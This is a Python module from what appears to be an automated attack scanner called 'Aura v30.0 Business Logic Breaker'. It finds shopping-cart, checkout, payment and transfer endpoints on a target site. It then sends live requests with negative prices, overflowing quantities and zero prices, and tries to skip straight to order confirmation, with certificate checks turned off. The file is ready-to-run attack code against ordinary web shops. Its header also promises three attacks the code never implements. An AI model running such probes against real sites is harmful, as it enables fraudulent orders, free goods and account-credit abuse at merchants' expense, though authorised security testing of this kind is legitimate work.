"""
Aura v30.0 — Business Logic Breaker 💰
========================================
Detects business logic flaws — hard to find but highly rewarding.

Attacks:
  1. Negative Price/Quantity — send -1, -999 as purchase amount
  2. Integer Overflow — send 2^31 as quantity/price
  3. Free Item Exploit — zero-price or zero-quantity purchase
  4. Coupon Stacking — apply multiple discounts simultaneously
  5. Workflow Step Skipping — access checkout without cart items
  6. Limit Bypass — exceed per-user purchase/transfer limits
  7. Currency Confusion — send fractional or negative currency values
"""
import asyncio
import json
import httpx
import re
from rich.console import Console

console = Console()

# Common e-commerce / financial endpoint patterns
COMMERCE_PATTERNS = [
    "/cart", "/checkout", "/order", "/purchase", "/buy",
    "/api/cart", "/api/order", "/api/checkout", "/api/purchase",
    "/payment", "/transfer", "/withdraw", "/redeem",
    "/api/payment", "/api/transfer", "/promo", "/coupon",
    "/api/coupon", "/discount", "/api/discount",
]

INT_OVERFLOW = 2**31 - 1
NEG_VALUES = [-1, -100, -999999, 0]

SUCCESS_PATTERNS = re.compile(
    r'"success"\s*:\s*true|"status"\s*:\s*"ok"|"status"\s*:\s*200|"result"\s*:\s*"success"',
    re.IGNORECASE
)


class BusinessLogicEngine:
    """v30.0: Business Logic Breaker."""

    def __init__(self, session=None):
        self.session = session

    # ── Endpoint Discovery ────────────────────────────────────────────────
    async def _discover_commerce_endpoints(self, client, base_url: str) -> list:
        found = []
        sem = asyncio.Semaphore(10)

        async def _probe(path):
            async with sem:
                url = f"{base_url.rstrip('/')}{path}"
                try:
                    r = await client.get(url, timeout=6)
                    if r.status_code not in (404, 502, 503):
                        found.append(url)
                except Exception:
                    pass

        await asyncio.gather(*[_probe(p) for p in COMMERCE_PATTERNS])
        return list(set(found))

    # ── Attack 1: Negative Price/Quantity ─────────────────────────────────
    async def _negative_value_attack(self, client, url: str) -> dict | None:
        """Sends negative price/quantity to see if orders succeed."""
        payloads = [
            {"price": -1, "quantity": 1, "amount": -1},
            {"price": -99.99, "qty": 1},
            {"quantity": -100, "item_id": 1},
            {"amount": -500, "currency": "USD"},
        ]
        for payload in payloads:
            try:
                r = await client.post(url, json=payload, timeout=8)
                body = r.text
                if r.status_code in (200, 201) and SUCCESS_PATTERNS.search(body):
                    return {
                        "type": "Negative Price / Business Logic Bypass",
                        "finding_type": "Business Logic Flaw — Negative Value",
                        "severity": "CRITICAL",
                        "owasp": "A04:2021 – Insecure Design",
                        "mitre": "T1565 – Data Manipulation",
                        "content": (
                            f"Negative price/quantity accepted on {url}\n"
                            f"Payload: {json.dumps(payload)}\n"
                            f"Response: {body[:300]}\n"
                            f"Impact: Attacker may credit their account or purchase items for free."
                        ),
                        "url": url,
                        "confirmed": True,
                    }
            except Exception:
                continue
        return None

    # ── Attack 2: Integer Overflow ────────────────────────────────────────
    async def _integer_overflow_attack(self, client, url: str) -> dict | None:
        payloads = [
            {"quantity": INT_OVERFLOW, "price": 1},
            {"amount": INT_OVERFLOW},
            {"quantity": 2**63},
            {"price": 0.000001, "quantity": INT_OVERFLOW},
        ]
        for payload in payloads:
            try:
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201) and not re.search(
                    r'invalid|out of range|overflow|too large|maximum', r.text, re.IGNORECASE
                ):
                    return {
                        "type": "Integer Overflow / Quantity Manipulation",
                        "finding_type": "Business Logic Flaw — Integer Overflow",
                        "severity": "HIGH",
                        "owasp": "A04:2021 – Insecure Design",
                        "mitre": "T1565",
                        "content": (
                            f"Large integer accepted without validation on {url}\n"
                            f"Payload: {json.dumps({k: str(v) for k, v in payload.items()})}\n"
                            f"Response status: {r.status_code}\n"
                            f"Impact: May cause integer overflow, free/cheap purchases, or credit inflation."
                        ),
                        "url": url,
                        "confirmed": False,
                    }
            except Exception:
                continue
        return None

    # ── Attack 3: Zero/Free Item ──────────────────────────────────────────
    async def _free_item_attack(self, client, url: str) -> dict | None:
        payloads = [
            {"price": 0, "quantity": 1},
            {"amount": 0.00},
            {"price": 0.0001, "quantity": 1},
            {"total": 0},
        ]
        for payload in payloads:
            try:
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201) and SUCCESS_PATTERNS.search(r.text):
                    return {
                        "type": "Zero Price / Free Item Business Logic",
                        "finding_type": "Business Logic Flaw — Free Item",
                        "severity": "HIGH",
                        "owasp": "A04:2021 – Insecure Design",
                        "mitre": "T1565",
                        "content": (
                            f"Zero/minimal price accepted on {url}\n"
                            f"Payload: {json.dumps(payload)}\n"
                            f"Impact: Attacker can purchase items for free."
                        ),
                        "url": url,
                        "confirmed": False,
                    }
            except Exception:
                continue
        return None

    # ── Attack 4: Workflow Step Skipping ─────────────────────────────────
    async def _step_skip_attack(self, client, base_url: str) -> dict | None:
        """Tries to access checkout/confirmation without going through earlier steps."""
        skip_targets = [
            "/checkout/confirm", "/checkout/complete", "/order/confirm",
            "/api/order/complete", "/payment/confirm", "/order/finalize",
        ]
        for path in skip_targets:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                # Direct access without session/cart items
                r = await client.post(url, json={"skip_validation": True}, timeout=8)
                if r.status_code in (200, 201) and SUCCESS_PATTERNS.search(r.text):
                    return {
                        "type": "Workflow Step Skipping",
                        "finding_type": "Business Logic Flaw — Step Skipping",
                        "severity": "HIGH",
                        "owasp": "A04:2021 – Insecure Design",
                        "mitre": "T1078",
                        "content": (
                            f"Checkout/order step skipped without prior validation on {url}\n"
                            f"Accessed final step directly — server returned success.\n"
                            f"Impact: May allow order completion without payment."
                        ),
                        "url": url,
                        "confirmed": False,
                    }
            except Exception:
                continue
        return None

    # ── Main Scan ─────────────────────────────────────────────────────────
    async def scan_target(self, target_url: str) -> list:
        from urllib.parse import urlparse
        base = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
        findings = []

        console.print(f"[bold cyan][💰 BizLogic] Scanning {base} for business logic flaws...[/bold cyan]")

        async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
            endpoints = await self._discover_commerce_endpoints(client, base)

            if not endpoints:
                console.print(f"[dim][BizLogic] No commerce endpoints found on {base}[/dim]")
                # Still test step skipping on base
                skip_result = await self._step_skip_attack(client, base)
                if skip_result:
                    findings.append(skip_result)
                return findings

            console.print(f"[cyan][💰 BizLogic] Found {len(endpoints)} commerce endpoint(s). Testing...[/cyan]")

            # Test step skipping at base level
            skip_result = await self._step_skip_attack(client, base)
            if skip_result:
                console.print(f"[bold red][💰 BizLogic] {skip_result['type']}![/bold red]")
                findings.append(skip_result)

            sem = asyncio.Semaphore(5)

            async def _test_endpoint(url):
                async with sem:
                    results = await asyncio.gather(
                        self._negative_value_attack(client, url),
                        self._integer_overflow_attack(client, url),
                        self._free_item_attack(client, url),
                        return_exceptions=True
                    )
                    hits = [r for r in results if r and not isinstance(r, Exception)]
                    return hits

            all_results = await asyncio.gather(*[_test_endpoint(u) for u in endpoints[:10]])
            for result_list in all_results:
                for f in result_list:
                    console.print(f"[bold red][💰 BizLogic] {f['type']}![/bold red]")
                    findings.append(f)

        if not findings:
            console.print(f"[dim][BizLogic] No business logic flaws detected.[/dim]")
        return findings

    async def scan_urls(self, urls: list) -> list:
        seen = set()
        all_findings = []
        for url in urls:
            from urllib.parse import urlparse
            base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            if base in seen:
                continue
            seen.add(base)
            try:
                results = await self.scan_target(url)
                all_findings.extend(results)
            except Exception as e:
                console.print(f"[dim red][BizLogic] Skipped {url}: {e}[/dim red]")
        return all_findings
